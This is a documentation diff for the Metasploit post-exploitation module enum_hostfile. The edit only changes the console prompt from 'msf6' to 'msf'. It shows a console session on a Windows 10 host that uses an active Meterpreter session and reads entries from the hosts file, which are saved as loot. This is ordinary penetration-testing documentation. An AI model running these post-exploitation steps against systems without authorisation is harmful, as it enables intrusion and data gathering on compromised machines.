@@ -20,8 +20,8 @@ and the file is stored in loot.
 ### Windows 10
 
 ```
-msf6 post(windows/gather/enum_hostfile) > use post/windows/gather/enum_hostfile 
-msf6 post(windows/gather/enum_hostfile) > sessions -i 5
+msf post(windows/gather/enum_hostfile) > use post/windows/gather/enum_hostfile 
+msf post(windows/gather/enum_hostfile) > sessions -i 5
 [*] Starting interaction with 5...
 
 meterpreter > sysinfo
@@ -34,9 +34,9 @@ Logged On Users : 2
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 5...
-msf6 post(windows/gather/enum_hostfile) > set session 5
+msf post(windows/gather/enum_hostfile) > set session 5
 session => 5
-msf6 post(windows/gather/enum_hostfile) > run
+msf post(windows/gather/enum_hostfile) > run
 
 Found entries:
 [+] 1.1.1.1 supersecret
